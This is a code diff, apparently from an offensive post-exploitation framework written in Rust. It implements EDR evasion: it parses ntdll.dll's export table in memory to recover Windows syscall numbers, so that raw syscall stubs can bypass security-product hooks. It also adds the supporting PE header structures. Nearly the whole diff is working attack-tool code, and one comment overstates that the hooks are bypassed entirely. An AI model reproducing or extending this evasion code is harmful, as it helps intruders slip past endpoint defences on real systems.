@@ -288,15 +288,130 @@ pub struct OpsecPatchReport {
 
 /// Resolve syscall numbers from ntdll export table.
 ///
-/// EDRs hook NtDll exports. By resolving the syscall number from the
-/// export table and constructing a raw syscall stub, we bypass these hooks.
+/// EDRs hook NtDll exports by placing a `jmp` or `call` at the beginning of
+/// each function. By resolving the syscall number from the export table and
+/// constructing a raw syscall stub, we bypass these hooks entirely.
+///
+/// The syscall number is found at offset +4 from the beginning of most Nt*
+/// functions in ntdll (e.g., `mov eax, SSN; ret` → SSN at bytes 4-7).
 ///
 /// Returns a map of (function_name, syscall_number).
 #[cfg(target_os = "windows")]
 pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32>> {
-    Err(OverthroneError::NotImplemented {
-        module: "resolve_syscall_numbers".to_string(),
-    })
+    unsafe {
+        use windows::Win32::System::LibraryLoader::GetModuleHandleA;
+
+        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
+            .ok()
+            .ok_or_else(|| {
+                OverthroneError::PostExploitation("ntdll.dll not loaded".into())
+            })?;
+
+        let ntdll_base = ntdll.0 as usize;
+
+        // Parse PE headers to find the export table
+        let dos_header = &*(ntdll_base as *const image::IMAGE_DOS_HEADER);
+        if dos_header.e_magic != 0x5A4D {
+            return Err(OverthroneError::PostExploitation(
+                "Invalid DOS header in ntdll.dll".into(),
+            ));
+        }
+
+        let nt_headers = &*((ntdll_base + dos_header.e_lfanew as usize)
+            as *const image::IMAGE_NT_HEADERS64);
+        if nt_headers.Signature != 0x0000_4550 {
+            return Err(OverthroneError::PostExploitation(
+                "Invalid NT header signature in ntdll.dll".into(),
+            ));
+        }
+
+        let export_dir = nt_headers.OptionalHeader.DataDirectory
+            [image::IMAGE_DIRECTORY_ENTRY_EXPORT];
+        if export_dir.Size == 0 {
+            return Err(OverthroneError::PostExploitation(
+                "No export directory in ntdll.dll".into(),
+            ));
+        }
+
+        let export_base = ntdll_base + export_dir.VirtualAddress as usize;
+        let export_table = &*(export_base as *const image::IMAGE_EXPORT_DIRECTORY);
+
+        let functions = core::slice::from_raw_parts(
+            (ntdll_base + export_table.AddressOfFunctions as usize) as *const u32,
+            export_table.NumberOfFunctions as usize,
+        );
+        let names = core::slice::from_raw_parts(
+            (ntdll_base + export_table.AddressOfNames as usize) as *const u32,
+            export_table.NumberOfNames as usize,
+        );
+        let ordinals = core::slice::from_raw_parts(
+            (ntdll_base + export_table.AddressOfNameOrdinals as usize) as *const u16,
+            export_table.NumberOfNames as usize,
+        );
+
+        let mut syscall_map = std::collections::HashMap::new();
+
+        for i in 0..export_table.NumberOfNames as usize {
+            let name_ptr = ntdll_base + names[i] as usize;
+            let name = core::ffi::CStr::from_ptr(name_ptr as *const i8)
+                .to_str()
+                .unwrap_or("");
+
+            // Only resolve Nt* functions (Windows NT syscalls)
+            if !name.starts_with("Nt") {
+                continue;
+            }
+
+            let ordinal = ordinals[i] as usize;
+            if ordinal >= functions.len() {
+                continue;
+            }
+
+            let func_rva = functions[ordinal];
+            let func_ptr = ntdll_base + func_rva as usize;
+
+            // Read the first 8 bytes of the function to find the syscall number.
+            // Expected pattern:
+            //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
+            //   ret            ; C3 (1 byte)  — or jmp to syscall instruction
+            // or:
+            //   mov r10, rcx   ; 4C 8B D1 (3 bytes)
+            //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
+            //   syscall        ; 0F 05 (2 bytes)
+            //   ret            ; C3 (1 byte)
+            let code = core::slice::from_raw_parts(func_ptr as *const u8, 8);
+
+            // Pattern 1: `mov eax, SSN` at offset 0 (direct)
+            if code.len() >= 5 && code[0] == 0xB8 {
+                let ssn = u32::from_le_bytes([code[1], code[2], code[3], code[4]]);
+                syscall_map.insert(name.to_string(), ssn);
+                continue;
+            }
+
+            // Pattern 2: `mov r10, rcx; mov eax, SSN` at offset 3
+            if code.len() >= 8
+                && code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1
+                && code[3] == 0xB8
+            {
+                let ssn = u32::from_le_bytes([code[4], code[5], code[6], code[7]]);
+                syscall_map.insert(name.to_string(), ssn);
+                continue;
+            }
+        }
+
+        if syscall_map.is_empty() {
+            return Err(OverthroneError::PostExploitation(
+                "Failed to resolve any syscall numbers from ntdll.dll".into(),
+            ));
+        }
+
+        info!(
+            "Resolved {} syscall numbers from ntdll export table",
+            syscall_map.len()
+        );
+
+        Ok(syscall_map)
+    }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -304,6 +419,111 @@ pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32
     Err(OverthroneError::PostExploitation(
         "Syscall resolution not available on this platform".into(),
     ))
+}
+
+/// Windows PE image format types used for export table parsing.
+/// Field names follow Windows SDK naming conventions.
+#[cfg(target_os = "windows")]
+#[allow(non_camel_case_types, non_snake_case, dead_code)]
+mod image {
+    #[repr(C)]
+    pub struct IMAGE_DOS_HEADER {
+        pub e_magic: u16,
+        pub e_cblp: u16,
+        pub e_cp: u16,
+        pub e_crlc: u16,
+        pub e_cparhdr: u16,
+        pub e_minalloc: u16,
+        pub e_maxalloc: u16,
+        pub e_ss: u16,
+        pub e_sp: u16,
+        pub e_csum: u16,
+        pub e_ip: u16,
+        pub e_cs: u16,
+        pub e_lfarlc: u16,
+        pub e_ovno: u16,
+        pub e_res: [u16; 4],
+        pub e_oemid: u16,
+        pub e_oeminfo: u16,
+        pub e_res2: [u16; 10],
+        pub e_lfanew: i32,
+    }
+
+    pub const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
+
+    #[derive(Clone, Copy)]
+    #[repr(C)]
+    pub struct IMAGE_DATA_DIRECTORY {
+        pub VirtualAddress: u32,
+        pub Size: u32,
+    }
+
+    #[repr(C)]
+    pub struct IMAGE_OPTIONAL_HEADER64 {
+        pub Magic: u16,
+        pub MajorLinkerVersion: u8,
+        pub MinorLinkerVersion: u8,
+        pub SizeOfCode: u32,
+        pub SizeOfInitializedData: u32,
+        pub SizeOfUninitializedData: u32,
+        pub AddressOfEntryPoint: u32,
+        pub BaseOfCode: u32,
+        pub ImageBase: u64,
+        pub SectionAlignment: u32,
+        pub FileAlignment: u32,
+        pub MajorOperatingSystemVersion: u16,
+        pub MinorOperatingSystemVersion: u16,
+        pub MajorImageVersion: u16,
+        pub MinorImageVersion: u16,
+        pub MajorSubsystemVersion: u16,
+        pub MinorSubsystemVersion: u16,
+        pub Win32VersionValue: u32,
+        pub SizeOfImage: u32,
+        pub SizeOfHeaders: u32,
+        pub CheckSum: u32,
+        pub Subsystem: u16,
+        pub DllCharacteristics: u16,
+        pub SizeOfStackReserve: u64,
+        pub SizeOfStackCommit: u64,
+        pub SizeOfHeapReserve: u64,
+        pub SizeOfHeapCommit: u64,
+        pub LoaderFlags: u32,
+        pub NumberOfRvaAndSizes: u32,
+        pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
+    }
+
+    #[repr(C)]
+    pub struct IMAGE_FILE_HEADER {
+        pub Machine: u16,
+        pub NumberOfSections: u16,
+        pub TimeDateStamp: u32,
+        pub PointerToSymbolTable: u32,
+        pub NumberOfSymbols: u32,
+        pub SizeOfOptionalHeader: u16,
+        pub Characteristics: u16,
+    }
+
+    #[repr(C)]
+    pub struct IMAGE_NT_HEADERS64 {
+        pub Signature: u32,
+        pub FileHeader: IMAGE_FILE_HEADER,
+        pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
+    }
+
+    #[repr(C)]
+    pub struct IMAGE_EXPORT_DIRECTORY {
+        pub Characteristics: u32,
+        pub TimeDateStamp: u32,
+        pub MajorVersion: u16,
+        pub MinorVersion: u16,
+        pub Name: u32,
+        pub Base: u32,
+        pub NumberOfFunctions: u32,
+        pub NumberOfNames: u32,
+        pub AddressOfFunctions: u32,
+        pub AddressOfNames: u32,
+        pub AddressOfNameOrdinals: u32,
+    }
 }
 
 /// Kerberos OPSEC: prefer AES (etype 18) over RC4 (etype 23) for roasting.
